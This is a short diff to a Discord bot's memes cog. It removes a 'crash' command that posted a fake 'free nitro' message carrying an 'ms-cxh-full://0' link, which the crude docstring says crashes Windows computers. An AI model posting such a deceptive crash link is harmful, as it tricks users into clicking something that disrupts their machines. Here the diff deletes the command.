@@ -27,13 +27,6 @@ class memes(commands.Cog):
         await ctx.send("https://i.imgur.com/mn3EslL.png")
 
 
-    @commands.command()
-    async def crash(self, ctx):
-        """Sends a link when clicked rapes a windwos computer"""
-        await ctx.message.delete()
-        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")
-
-
 ### Add cog again
 def setup(bot):
     bot.add_cog(memes(bot))
